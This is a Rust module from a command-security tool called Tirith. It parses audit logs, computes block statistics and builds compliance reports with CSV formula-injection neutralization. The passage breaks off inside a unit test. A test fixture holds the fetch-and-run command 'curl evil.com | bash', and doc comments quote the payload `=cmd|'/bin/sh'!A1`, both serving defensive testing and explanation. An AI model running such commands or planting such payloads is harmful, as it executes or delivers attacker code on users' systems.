/// Audit log aggregation, analytics, and compliance reporting.
///
/// Reads JSONL audit log files and provides:
/// - Export: filter + format as JSON/CSV
/// - Stats: summary analytics per session or overall
/// - Report: structured compliance report
use std::collections::HashMap;
use std::io::BufRead;
use std::path::Path;

use serde::{Deserialize, Serialize};

fn default_entry_type() -> String {
    "verdict".to_string()
}

/// A parsed audit log entry (superset of what we write — tolerates missing fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditRecord {
    pub timestamp: String,
    #[serde(default)]
    pub session_id: String,
    pub action: String,
    #[serde(default)]
    pub rule_ids: Vec<String>,
    #[serde(default)]
    pub command_redacted: String,
    #[serde(default)]
    pub bypass_requested: bool,
    #[serde(default)]
    pub bypass_honored: bool,
    #[serde(default)]
    pub interactive: bool,
    #[serde(default)]
    pub policy_path: Option<String>,
    #[serde(default)]
    pub event_id: Option<String>,
    #[serde(default)]
    pub tier_reached: u8,

    /// Tagged-union discriminator — "verdict", "hook_telemetry", or "trust_change".
    #[serde(default = "default_entry_type")]
    pub entry_type: String,

    #[serde(default)]
    pub event: Option<String>,
    #[serde(default)]
    pub integration: Option<String>,
    #[serde(default)]
    pub hook_type: Option<String>,
    #[serde(default)]
    pub detail: Option<String>,
    #[serde(default)]
    pub elapsed_ms: Option<f64>,

    #[serde(default)]
    pub raw_action: Option<String>,
    #[serde(default)]
    pub raw_rule_ids: Option<Vec<String>>,

    #[serde(default)]
    pub trust_pattern: Option<String>,
    #[serde(default)]
    pub trust_rule_id: Option<String>,
    #[serde(default)]
    pub trust_action: Option<String>,
    #[serde(default)]
    pub trust_ttl_expires: Option<String>,
    #[serde(default)]
    pub trust_scope: Option<String>,

    /// M4 item 8 chunk 1: caller origin. Old log files without this field
    /// parse cleanly (serde `default`).
    #[serde(default)]
    pub agent_origin: Option<crate::agent_origin::AgentOrigin>,
}

/// Filters for audit log queries.
#[derive(Debug, Default)]
pub struct AuditFilter {
    /// Only include records at or after this ISO 8601 date.
    pub since: Option<String>,
    /// Only include records at or before this ISO 8601 date.
    pub until: Option<String>,
    /// Filter to a specific session ID.
    pub session_id: Option<String>,
    /// Filter to records with a specific action (Allow, Warn, Block).
    pub action: Option<String>,
    /// Filter to records matching any of these rule IDs.
    pub rule_ids: Vec<String>,
    /// Filter by entry type ("verdict", "hook_telemetry", "trust_change").
    /// Defaults to "verdict" when None to preserve backward compatibility.
    pub entry_type: Option<String>,
}

/// Summary statistics from audit records.
#[derive(Debug, Clone, Serialize)]
pub struct AuditStats {
    pub total_commands: usize,
    pub total_findings: usize,
    pub actions: HashMap<String, usize>,
    pub top_rules: Vec<(String, usize)>,
    pub block_rate: f64,
    pub sessions_seen: usize,
    pub time_range: Option<(String, String)>,
    /// Total findings from raw detection (before paranoia filtering).
    pub raw_total_findings: usize,
    /// Top rules from raw detection (before paranoia filtering).
    pub raw_top_rules: Vec<(String, usize)>,
}

/// Summary statistics for hook telemetry events.
#[derive(Debug, Clone, Serialize)]
pub struct HookStats {
    pub total_events: usize,
    pub events_by_integration: HashMap<String, HashMap<String, usize>>,
    pub top_events: Vec<(String, usize)>,
}

/// Result of reading an audit log, including accounting for skipped lines.
pub struct ReadLogResult {
    pub records: Vec<AuditRecord>,
    pub skipped_lines: usize,
}

/// Read and parse all records from a JSONL audit log.
///
/// This is the file-reading entry. It STREAMS the file line-by-line through a
/// [`std::io::BufReader`] (following symlinks, no size cap on the file as a
/// whole, but never buffering the entire file in memory at once) and feeds each
/// line to the shared per-line parser via [`parse_log_from_reader`]. For a large
/// append-only audit log this keeps the working-set memory bounded by the
/// longest line rather than the whole file. The parse result, malformed-line
/// skipping, and [`ReadLogResult::skipped_lines`] accounting are byte-identical
/// to the historical whole-file (`read_to_string` + [`parse_log`]) path — only
/// the memory profile differs.
///
/// Callers that have already read the log through a hardened/size-capped reader
/// (e.g. the offline dashboard, which must not block on a FIFO or OOM on an
/// attacker-influenced path) should call [`parse_log`] directly with the bounded
/// content instead of `read_log`.
pub fn read_log(path: &Path) -> Result<ReadLogResult, String> {
    let file =
        std::fs::File::open(path).map_err(|e| format!("Failed to read {}: {e}", path.display()))?;
    let reader = std::io::BufReader::new(file);
    parse_log_from_reader(reader, Some(path))
}

/// Parse JSONL audit-log lines streamed from `reader` into records.
///
/// The streaming counterpart of [`parse_log`]: instead of taking the whole log
/// as one `&str` it pulls one line at a time from a [`BufRead`], so a caller
/// (e.g. [`read_log`]) can avoid buffering an unbounded append-only log in
/// memory. Behavior — malformed-line skipping, the one-line stderr warning, and
/// [`ReadLogResult::skipped_lines`] accounting — is identical to [`parse_log`].
/// `source` is only used to label the warning; pass `None` when there is no
/// meaningful path to name.
///
/// A read I/O error mid-stream is TERMINAL — the loop stops and returns `Err`,
/// matching the former whole-file contract (`read_to_string` rejected such a
/// file with an I/O error). This is NOT a skippable line: a non-advancing error
/// (e.g. `EISDIR` when `path` is a directory — `File::open` succeeds on a
/// directory on Unix, then every read returns the same error WITHOUT advancing
/// the position) would otherwise spin forever. (A successfully-read line that is
/// merely malformed JSON is still skipped + counted by `parse_log_line`; only an
/// unreadable byte stream is fatal.)
pub fn parse_log_from_reader(
    reader: impl BufRead,
    source: Option<&Path>,
) -> Result<ReadLogResult, String> {
    let mut records = Vec::new();
    let mut skipped_lines = 0usize;
    for (idx, line) in reader.lines().enumerate() {
        let line_num = idx + 1;
        match line {
            Ok(line) => parse_log_line(&line, line_num, source, &mut records, &mut skipped_lines),
            Err(e) => {
                let where_ = source
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|| "<audit log>".to_string());
                return Err(format!("Failed to read {where_}: {e}"));
            }
        }
    }
    Ok(ReadLogResult {
        records,
        skipped_lines,
    })
}

/// Parse JSONL audit-log `content` (already read into memory) into records.
///
/// Split out of [`read_log`] so a caller that reads the log through a hardened,
/// size-capped reader can reuse the EXACT same parse + malformed-line accounting
/// without `read_log`'s streaming file read. Malformed lines are skipped (with a
/// one-line stderr warning) and counted in [`ReadLogResult::skipped_lines`],
/// identical to the streaming [`read_log`] / [`parse_log_from_reader`] behavior.
/// `source` is only used to label the warning; pass `None` when there is no
/// meaningful path to name.
pub fn parse_log(content: &str, source: Option<&Path>) -> ReadLogResult {
    let mut records = Vec::new();
    let mut skipped_lines = 0usize;
    for (line_num, line) in content.lines().enumerate() {
        parse_log_line(line, line_num + 1, source, &mut records, &mut skipped_lines);
    }
    ReadLogResult {
        records,
        skipped_lines,
    }
}

/// Parse one already-decoded log `line` (1-based `line_num`), pushing a parsed
/// [`AuditRecord`] onto `records` or counting a skip in `skipped_lines`.
///
/// Shared by [`parse_log`] (whole-file `&str`) and [`parse_log_from_reader`]
/// (streamed) so both paths apply the SAME trim / empty-skip / malformed-line
/// rules and produce byte-identical results.
fn parse_log_line(
    line: &str,
    line_num: usize,
    source: Option<&Path>,
    records: &mut Vec<AuditRecord>,
    skipped_lines: &mut usize,
) {
    let line = line.trim();
    if line.is_empty() {
        return;
    }
    match serde_json::from_str::<AuditRecord>(line) {
        Ok(record) => records.push(record),
        Err(e) => {
            warn_malformed_line(line_num, source, &e);
            *skipped_lines += 1;
        }
    }
}

/// Emit the one-line stderr warning for a skipped audit line. Shared so the
/// whole-file and streaming paths produce the IDENTICAL warning text (the
/// file-path `Display` in the malformed-line warning must not drift between
/// the two entries).
fn warn_malformed_line(line_num: usize, source: Option<&Path>, e: &dyn std::fmt::Display) {
    match source {
        Some(path) => eprintln!(
            "tirith: warning: skipping malformed audit line {} in {}: {e}",
            line_num,
            path.display()
        ),
        None => eprintln!("tirith: warning: skipping malformed audit line {line_num}: {e}"),
    }
}

/// Parse an RFC 3339 timestamp, falling back to lexicographic comparison on failure.
fn parse_ts(ts: &str) -> Option<chrono::DateTime<chrono::FixedOffset>> {
    chrono::DateTime::parse_from_rfc3339(ts).ok()
}

/// Returns true if a record's entry_type matches the requested filter value.
/// Empty string and "verdict" are treated equivalently (backward compat for old log entries).
fn entry_type_matches(record_type: &str, filter_type: &str) -> bool {
    if filter_type == "all" {
        return true;
    }
    let normalized = if record_type.is_empty() {
        "verdict"
    } else {
        record_type
    };
    normalized == filter_type
}

/// Filter records by the given criteria.
pub fn filter_records(records: &[AuditRecord], filter: &AuditFilter) -> Vec<AuditRecord> {
    // Default entry_type filter to "verdict" when not set
    let entry_type_filter = filter.entry_type.as_deref().unwrap_or("verdict");

    records
        .iter()
        .filter(|r| {
            if !entry_type_matches(&r.entry_type, entry_type_filter) {
                return false;
            }
            // Parse timestamps so --since/--until compare with timezone awareness;
            // fall back to lexicographic compare when either side fails to parse.
            if let Some(ref since) = filter.since {
                match (parse_ts(&r.timestamp), parse_ts(since)) {
                    (Some(rt), Some(st)) => {
                        if rt < st {
                            return false;
                        }
                    }
                    _ => {
                        if r.timestamp.as_str() < since.as_str() {
                            return false;
                        }
                    }
                }
            }
            if let Some(ref until) = filter.until {
                match (parse_ts(&r.timestamp), parse_ts(until)) {
                    (Some(rt), Some(ut)) => {
                        if rt > ut {
                            return false;
                        }
                    }
                    _ => {
                        if r.timestamp.as_str() > until.as_str() {
                            return false;
                        }
                    }
                }
            }
            if let Some(ref sid) = filter.session_id {
                if r.session_id != *sid {
                    return false;
                }
            }
            if let Some(ref action) = filter.action {
                if !r.action.eq_ignore_ascii_case(action) {
                    return false;
                }
            }
            if !filter.rule_ids.is_empty()
                && !r.rule_ids.iter().any(|rid| filter.rule_ids.contains(rid))
            {
                return false;
            }
            true
        })
        .cloned()
        .collect()
}

/// Compute summary statistics from a set of audit records.
/// Only considers records with entry_type "verdict" (or empty, for old records).
pub fn compute_stats(records: &[AuditRecord]) -> AuditStats {
    let mut actions: HashMap<String, usize> = HashMap::new();
    let mut rule_counts: HashMap<String, usize> = HashMap::new();
    let mut raw_rule_counts: HashMap<String, usize> = HashMap::new();
    let mut sessions: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut total_findings = 0usize;
    let mut raw_total_findings = 0usize;
    let mut total_commands = 0usize;

    // Empty entry_type indicates a pre-tagged-union log entry; treat it as "verdict".
    let is_verdict = |r: &&AuditRecord| r.entry_type.is_empty() || r.entry_type == "verdict";

    for record in records.iter().filter(is_verdict) {
        total_commands += 1;
        *actions.entry(record.action.clone()).or_insert(0) += 1;
        sessions.insert(record.session_id.clone());
        total_findings += record.rule_ids.len();
        for rid in &record.rule_ids {
            *rule_counts.entry(rid.clone()).or_insert(0) += 1;
        }
        // Raw (pre-paranoia) stats. Older records without raw_rule_ids fall back
        // to their effective rule_ids.
        if let Some(ref raw_ids) = record.raw_rule_ids {
            raw_total_findings += raw_ids.len();
            for rid in raw_ids {
                *raw_rule_counts.entry(rid.clone()).or_insert(0) += 1;
            }
        } else {
            raw_total_findings += record.rule_ids.len();
            for rid in &record.rule_ids {
                *raw_rule_counts.entry(rid.clone()).or_insert(0) += 1;
            }
        }
    }

    let block_count = *actions.get("Block").unwrap_or(&0) as f64;
    let total = total_commands as f64;
    let block_rate = if total > 0.0 {
        block_count / total
    } else {
        0.0
    };

    let mut top_rules: Vec<(String, usize)> = rule_counts.into_iter().collect();
    top_rules.sort_by_key(|r| std::cmp::Reverse(r.1));
    top_rules.truncate(10);

    let time_range = if total_commands == 0 {
        None
    } else {
        // Parsed-timestamp min/max — can't assume records are in arrival order.
        let min_ts = records
            .iter()
            .filter(is_verdict)
            .min_by(
                |a, b| match (parse_ts(&a.timestamp), parse_ts(&b.timestamp)) {
                    (Some(ta), Some(tb)) => ta.cmp(&tb),
                    _ => a.timestamp.cmp(&b.timestamp),
                },
            )
            .map(|r| r.timestamp.clone())
            .unwrap_or_default();
        let max_ts = records
            .iter()
            .filter(is_verdict)
            .max_by(
                |a, b| match (parse_ts(&a.timestamp), parse_ts(&b.timestamp)) {
                    (Some(ta), Some(tb)) => ta.cmp(&tb),
                    _ => a.timestamp.cmp(&b.timestamp),
                },
            )
            .map(|r| r.timestamp.clone())
            .unwrap_or_default();
        Some((min_ts, max_ts))
    };

    let mut raw_top_rules: Vec<(String, usize)> = raw_rule_counts.into_iter().collect();
    raw_top_rules.sort_by_key(|r| std::cmp::Reverse(r.1));
    raw_top_rules.truncate(10);

    AuditStats {
        total_commands,
        total_findings,
        actions,
        top_rules,
        block_rate,
        sessions_seen: sessions.len(),
        time_range,
        raw_total_findings,
        raw_top_rules,
    }
}

/// Compute summary statistics for hook telemetry events.
pub fn compute_hook_stats(records: &[AuditRecord]) -> HookStats {
    let mut events_by_integration: HashMap<String, HashMap<String, usize>> = HashMap::new();
    let mut event_counts: HashMap<String, usize> = HashMap::new();
    let mut total_events = 0usize;

    for record in records.iter().filter(|r| r.entry_type == "hook_telemetry") {
        total_events += 1;
        let integration = record
            .integration
            .as_deref()
            .unwrap_or("unknown")
            .to_string();
        let event = record.event.as_deref().unwrap_or("unknown").to_string();

        *events_by_integration
            .entry(integration)
            .or_default()
            .entry(event.clone())
            .or_insert(0) += 1;
        *event_counts.entry(event).or_insert(0) += 1;
    }

    let mut top_events: Vec<(String, usize)> = event_counts.into_iter().collect();
    top_events.sort_by_key(|e| std::cmp::Reverse(e.1));
    top_events.truncate(10);

    HookStats {
        total_events,
        events_by_integration,
        top_events,
    }
}

/// Export records as JSON array.
pub fn export_json(records: &[AuditRecord]) -> String {
    serde_json::to_string_pretty(records).unwrap_or_else(|e| {
        eprintln!("tirith: audit: JSON serialization failed: {e}");
        "[]".to_string()
    })
}

/// Export records as CSV (RFC 4180 compliant). Only supports verdict entries.
///
/// `agent_origin` is appended as the last column so existing CSV consumers
/// see no column-position shift. The JSON export already carries the field;
/// CSV now exposes a compact stringification per variant
/// (`human(interactive)` / `agent:<tool>` / `mcp:<client_name>` / `gateway` /
/// `ci:<provider>` / `ide:<name>` / empty for `None`). Compliance dashboards
/// consuming CSV no longer lose agent attribution.
///
/// **CSV-injection neutralization.** The `agent_origin` value embeds a
/// caller-supplied `tool` name (`AgentOrigin::Agent { tool, .. }`), client
/// name (`AgentOrigin::Mcp { client_name, .. }`), and similar payload
/// fields. A hostile caller can declare a `tool` like `=cmd|'/bin/sh'!A1`,
/// and Excel / Google Sheets / LibreOffice will *evaluate* a cell that
/// starts with `=`, `+`, `-`, or `@` as a formula. The standard OWASP
/// mitigation — prefix the cell with a tab — neutralizes the formula
/// without altering the displayed value. Applied via
/// [`csv_neutralize_formula`] before [`csv_escape`] on every cell whose
/// content can carry caller-supplied bytes. (`timestamp` is engine-
/// generated; `bypass_requested` / `tier_reached` are typed bool/u8 and
/// non-string. The other text columns go through neutralization for
/// belt-and-braces — see the field-level rationale on the helper.)
pub fn export_csv(records: &[AuditRecord]) -> String {
    let mut out = String::new();
    out.push_str(
        "timestamp,session_id,action,rule_ids,command_redacted,bypass_requested,tier_reached,agent_origin\n",
    );
    for r in records {
        let rules = r.rule_ids.join(";");
        let origin = agent_origin_csv_render(&r.agent_origin);
        out.push_str(&format!(
            "{},{},{},{},{},{},{},{}\n",
            csv_escape(&r.timestamp),
            csv_escape(&r.session_id),
            csv_escape(&r.action),
            csv_escape(&csv_neutralize_formula(&rules)),
            csv_escape(&csv_neutralize_formula(&r.command_redacted)),
            r.bypass_requested,
            r.tier_reached,
            csv_escape(&csv_neutralize_formula(&origin)),
        ));
    }
    out
}

/// Render an [`AgentOrigin`] for the CSV `agent_origin` cell.
///
/// Variants collapse to a `kind:payload` shape so dashboards can split on `:`
/// without parsing JSON. `None` (old log rows that predate the field) yields
/// an empty cell.
fn agent_origin_csv_render(origin: &Option<crate::agent_origin::AgentOrigin>) -> String {
    use crate::agent_origin::AgentOrigin;
    match origin {
        None => String::new(),
        Some(AgentOrigin::Human { interactive: true }) => "human(interactive)".to_string(),
        Some(AgentOrigin::Human { interactive: false }) => "human".to_string(),
        Some(AgentOrigin::Agent { tool, version }) => match version {
            Some(v) => format!("agent:{tool}@{v}"),
            None => format!("agent:{tool}"),
        },
        Some(AgentOrigin::Mcp {
            client_name,
            client_version,
        }) => match client_version {
            Some(v) => format!("mcp:{client_name}@{v}"),
            None => format!("mcp:{client_name}"),
        },
        Some(AgentOrigin::Gateway) => "gateway".to_string(),
        Some(AgentOrigin::Ci { provider }) => match provider {
            Some(p) => format!("ci:{p}"),
            None => "ci".to_string(),
        },
        Some(AgentOrigin::Ide { name }) => format!("ide:{name}"),
    }
}

/// Escape a field for RFC 4180 CSV: if it contains commas, double quotes,
/// or newlines, wrap in double quotes and double any internal quotes.
fn csv_escape(field: &str) -> String {
    if field.contains(',') || field.contains('"') || field.contains('\n') || field.contains('\r') {
        let escaped = field.replace('"', "\"\"");
        format!("\"{escaped}\"")
    } else {
        field.to_string()
    }
}

/// Neutralize CSV-injection formulas by prefixing a tab to any cell that
/// would otherwise be evaluated as a formula by Excel / Google Sheets /
/// LibreOffice / Numbers.
///
/// **Threat.** Spreadsheet applications evaluate a cell whose first
/// character is `=`, `+`, `-`, or `@` as a formula. A caller-supplied
/// `agent_origin.tool` like `=cmd|'/bin/sh'!A1` (or similar in other
/// dialects) becomes RCE-adjacent when the audit CSV is opened in a
/// spreadsheet. The CSV column is appended to compliance dashboards that
/// auto-open in Excel — exactly the worst-case audience.
///
/// **Mitigation.** OWASP's recommended fix is to prefix a tab (`\t`).
/// Excel renders the tab as a literal character (so the cell still
/// reads as the intended value, just shifted) and refuses to interpret
/// the leading `=` / `+` / `-` / `@`. The single-quote (`'`) alternative
/// is consumed by Excel during display (cell shows the same value, no
/// shift) but is preserved verbatim by Google Sheets and LibreOffice,
/// producing an inconsistent rendering across tools. The tab approach
/// is consistent across every major spreadsheet.
///
/// **No-op on safe cells.** A cell that does not start with a formula
/// trigger is returned unchanged, so the common case adds zero bytes.
fn csv_neutralize_formula(s: &str) -> String {
    match s.as_bytes().first() {
        Some(b'=' | b'+' | b'-' | b'@') => format!("\t{s}"),
        _ => s.to_string(),
    }
}

/// Generate a markdown compliance report from audit records.
pub fn generate_compliance_report(records: &[AuditRecord], stats: &AuditStats) -> String {
    let mut report = String::new();

    report.push_str("# Tirith Compliance Report\n\n");

    report.push_str("## Executive Summary\n\n");
    report.push_str(&format!(
        "- **Total commands analyzed:** {}\n",
        stats.total_commands
    ));
    report.push_str(&format!("- **Total findings:** {}\n", stats.total_findings));
    report.push_str(&format!(
        "- **Block rate:** {:.1}%\n",
        stats.block_rate * 100.0
    ));
    report.push_str(&format!(
        "- **Sessions observed:** {}\n",
        stats.sessions_seen
    ));

    if let Some((ref first, ref last)) = stats.time_range {
        report.push_str(&format!("- **Time range:** {first} to {last}\n"));
    }
    report.push('\n');

    report.push_str("## Action Breakdown\n\n");
    report.push_str("| Action | Count |\n|--------|-------|\n");
    let mut actions: Vec<_> = stats.actions.iter().collect();
    actions.sort_by_key(|(a, _)| *a);
    for (action, count) in &actions {
        report.push_str(&format!("| {} | {count} |\n", escape_md_cell(action)));
    }
    report.push('\n');

    if !stats.top_rules.is_empty() {
        report.push_str("## Top Triggered Rules\n\n");
        report.push_str("| Rule ID | Count |\n|---------|-------|\n");
        for (rule, count) in &stats.top_rules {
            report.push_str(&format!("| {} | {count} |\n", escape_md_cell(rule)));
        }
        report.push('\n');
    }

    let blocked: Vec<_> = records
        .iter()
        .filter(|r| r.action.eq_ignore_ascii_case("Block"))
        .collect();
    if !blocked.is_empty() {
        report.push_str("## Blocked Commands\n\n");
        report.push_str(
            "| Timestamp | Rules | Command Preview |\n|-----------|-------|-----------------|\n",
        );
        for r in blocked.iter().take(50) {
            let rules = r.rule_ids.join(", ");
            report.push_str(&format!(
                "| {} | {} | {} |\n",
                escape_md_cell(&r.timestamp),
                escape_md_cell(&rules),
                escape_md_cell(&r.command_redacted)
            ));
        }
        if blocked.len() > 50 {
            report.push_str(&format!(
                "\n*...and {} more blocked commands*\n",
                blocked.len() - 50
            ));
        }
        report.push('\n');
    }

    report
}

/// Generate a self-contained HTML compliance report from audit records.
pub fn generate_html_report(records: &[AuditRecord], stats: &AuditStats) -> String {
    let mut html = String::new();
    html.push_str(
        r#"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Tirith Compliance Report</title>
<style>
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; color: #1a1a2e; background: #f8f9fa; }
h1 { color: #16213e; border-bottom: 2px solid #0f3460; padding-bottom: 0.5rem; }
h2 { color: #0f3460; margin-top: 2rem; }
table { border-collapse: collapse; width: 100%; margin: 1rem 0; }
th, td { border: 1px solid #dee2e6; padding: 0.5rem 0.75rem; text-align: left; }
th { background: #0f3460; color: white; }
tr:nth-child(even) { background: #e9ecef; }
.stat { display: inline-block; background: white; border: 1px solid #dee2e6; border-radius: 8px; padding: 1rem 1.5rem; margin: 0.5rem; text-align: center; min-width: 120px; }
.stat-value { font-size: 1.5rem; font-weight: bold; color: #0f3460; }
.stat-label { font-size: 0.85rem; color: #6c757d; }
.footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid #dee2e6; color: #6c757d; font-size: 0.85rem; }
</style>
</head>
<body>
<h1>Tirith Compliance Report</h1>
"#,
    );

    html.push_str("<div>\n");
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{}</div><div class=\"stat-label\">Commands</div></div>\n",
        stats.total_commands
    ));
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{}</div><div class=\"stat-label\">Findings</div></div>\n",
        stats.total_findings
    ));
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{:.1}%</div><div class=\"stat-label\">Block Rate</div></div>\n",
        stats.block_rate * 100.0
    ));
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{}</div><div class=\"stat-label\">Sessions</div></div>\n",
        stats.sessions_seen
    ));
    html.push_str("</div>\n");

    if let Some((ref first, ref last)) = stats.time_range {
        html.push_str(&format!(
            "<p><strong>Time range:</strong> {} to {}</p>\n",
            html_escape(first),
            html_escape(last)
        ));
    }

    html.push_str("<h2>Action Breakdown</h2>\n<table><tr><th>Action</th><th>Count</th></tr>\n");
    let mut actions: Vec<_> = stats.actions.iter().collect();
    actions.sort_by_key(|(a, _)| *a);
    for (action, count) in &actions {
        html.push_str(&format!(
            "<tr><td>{}</td><td>{}</td></tr>\n",
            html_escape(action),
            count
        ));
    }
    html.push_str("</table>\n");

    if !stats.top_rules.is_empty() {
        html.push_str(
            "<h2>Top Triggered Rules</h2>\n<table><tr><th>Rule ID</th><th>Count</th></tr>\n",
        );
        for (rule, count) in &stats.top_rules {
            html.push_str(&format!(
                "<tr><td>{}</td><td>{}</td></tr>\n",
                html_escape(rule),
                count
            ));
        }
        html.push_str("</table>\n");
    }

    let blocked: Vec<_> = records
        .iter()
        .filter(|r| r.action.eq_ignore_ascii_case("Block"))
        .collect();
    if !blocked.is_empty() {
        html.push_str("<h2>Blocked Commands</h2>\n<table><tr><th>Timestamp</th><th>Rules</th><th>Command Preview</th></tr>\n");
        for r in blocked.iter().take(50) {
            let rules = r.rule_ids.join(", ");
            html.push_str(&format!(
                "<tr><td>{}</td><td>{}</td><td>{}</td></tr>\n",
                html_escape(&r.timestamp),
                html_escape(&rules),
                html_escape(&r.command_redacted),
            ));
        }
        html.push_str("</table>\n");
        if blocked.len() > 50 {
            html.push_str(&format!(
                "<p><em>...and {} more blocked commands</em></p>\n",
                blocked.len() - 50
            ));
        }
    }

    html.push_str("<div class=\"footer\">Generated by Tirith</div>\n</body>\n</html>\n");
    html
}

/// Escape a markdown table cell: pipe characters and newlines break table formatting.
fn escape_md_cell(s: &str) -> String {
    s.replace('|', "\\|").replace('\n', " ").replace('\r', "")
}

/// Escape HTML special characters.
fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_records() -> Vec<AuditRecord> {
        vec![
            AuditRecord {
                timestamp: "2026-01-15T10:00:00Z".into(),
                session_id: "sess-001".into(),
                action: "Block".into(),
                rule_ids: vec!["curl_pipe_shell".into()],
                command_redacted: "curl evil.com | bash".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: true,
                policy_path: None,
                event_id: Some("evt-1".into()),
                tier_reached: 3,
                entry_type: "verdict".into(),
                event: None,
                integration: None,
                hook_type: None,
                detail: None,
                elapsed_ms: None,
                raw_action: None,
                raw_rule_ids: None,
                trust_pattern: None,
                trust_rule_id: None,
                trust_action: None,
                trust_ttl_expires: None,
                trust_scope: None,
                agent_origin: None,
            },
            AuditRecord {
                timestamp: "2026-01-15T10:01:00Z".into(),
                session_id: "sess-001".into(),
                action: "Allow".into(),
                rule_ids: vec![],
                command_redacted: "ls -la".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: true,
                policy_path: None,
                event_id: Some("evt-2".into()),
                tier_reached: 1,
                entry_type: "verdict".into(),
                event: None,
                integration: None,
                hook_type: None,
                detail: None,
                elapsed_ms: None,
                raw_action: None,
                raw_rule_ids: None,
                trust_pattern: None,
                trust_rule_id: None,
                trust_action: None,
                trust_ttl_expires: None,
                trust_scope: None,
                agent_origin: None,
            },
            AuditRecord {
                timestamp: "2026-01-16T12:00:00Z".into(),
                session_id: "sess-002".into(),
                action: "Warn".into(),
                rule_ids: vec!["non_ascii_hostname".into()],
                command_redacted: "curl http://examp\u{0142}e.com".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: false,
                policy_path: None,
                event_id: None,
                tier_reached: 3,
                entry_type: "verdict".into(),
                event: None,
                integration: None,
                hook_type: None,
                detail: None,
                elapsed_ms: None,
                raw_action: None,
                raw_rule_ids: None,
                trust_pattern: None,
                trust_rule_id: None,
                trust_action: None,
                trust_ttl_expires: None,
                trust_scope: None,
                agent_origin: None,
            },
        ]
    }

    #[test]
    fn test_filter_by_session() {
        let records = sample_records();
        let filter = AuditFilter {
            session_id: Some("sess-001".into()),
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 2);
    }

    #[test]
    fn test_filter_by_action() {
        let records = sample_records();
        let filter = AuditFilter {
            action: Some("Block".into()),
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 1);
        assert_eq!(filtered[0].action, "Block");
    }

    #[test]
    fn test_filter_by_since() {
        let records = sample_records();
        let filter = AuditFilter {
            since: Some("2026-01-16T00:00:00Z".into()),
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 1);
        assert_eq!(filtered[0].session_id, "sess-002");
    }

    #[test]
    fn test_filter_by_rule_ids() {
        let records = sample_records();
        let filter = AuditFilter {
            rule_ids: vec!["curl_pipe_shell".into()],
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn test_compute_stats() {
        let records = sample_records();
        let stats = compute_stats(&records);

        assert_eq!(stats.total_commands, 3);
        assert_eq!(stats.total_findings, 2);
        assert_eq!(stats.sessions_seen, 2);
        assert!((stats.block_rate - 1.0 / 3.0).abs() < 0.01);
        assert!(stats.time_range.is_some());
    }

    #[test]
    fn test_export_csv() {
        let records = sample_records();
        let csv = export_csv(&records);
        let lines: Vec<&str> = csv.lines().collect();
        assert_eq!(lines.len(), 4); // header + 3 records
        assert!(lines[0].starts_with("timestamp,"));
        assert!(lines[1].contains("Block"));
    }

    #[test]
    fn test_export_json() {
        let records = sample_records();
        let json = export_json(&records);
        let parsed: Vec<AuditRecord> = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.len(), 3);
    }

    #[test]
    fn test_compliance_report() {
        let records = sample_records();
        let stats = compute_stats(&records);
        let report = generate_compliance_report(&records, &stats);

        assert!(report.contains("# Tirith Compliance Report"));
        assert!(report.contains("Total commands analyzed"));
        assert!(report.contains("Block"));
        assert!(report.contains("curl_pipe_shell"));
    }

    #[test]
    fn test_csv_escape() {
        assert_eq!(csv_escape("simple"), "simple");
        assert_eq!(csv_escape("has,comma"), "\"has,comma\"");
        assert_eq!(csv_escape("has\"quote"), "\"has\"\"quote\"");
        assert_eq!(csv_escape("has\nnewline"), "\"has\nnewline\"");
        assert_eq!(csv_escape("a,b\"c\nd"), "\"a,b\"\"c\nd\"");
    }

    #[test]
    fn test_export_csv_rfc4180() {
        let records = vec![AuditRecord {
            timestamp: "2026-01-15T10:00:00Z".into(),
            session_id: "sess-001".into(),
            action: "Block".into(),
            rule_ids: vec!["test_rule".into()],
            command_redacted: "echo \"hello, world\"".into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: true,
            policy_path: None,
            event_id: None,
            tier_reached: 3,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: None,
        }];
        let csv = export_csv(&records);
        let lines: Vec<&str> = csv.lines().collect();
        assert_eq!(lines.len(), 2);
        assert!(lines[1].contains("\"echo \"\"hello, world\"\"\""));
    }

    #[test]
    fn test_export_csv_includes_agent_origin_column() {
        use crate::agent_origin::AgentOrigin;

        // A record with an MCP agent_origin, and one without (None).
        let mut records = vec![
            AuditRecord {
                timestamp: "2026-01-15T10:00:00Z".into(),
                session_id: "sess-001".into(),
                action: "Block".into(),
                rule_ids: vec!["test_rule".into()],
                command_redacted: "cmd".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: true,
                policy_path: None,
                event_id: None,
                tier_reached: 3,
                entry_type: "verdict".into(),
                event: None,
                integration: None,
                hook_type: None,
                detail: None,
                elapsed_ms: None,
                raw_action: None,
                raw_rule_ids: None,
                trust_pattern: None,
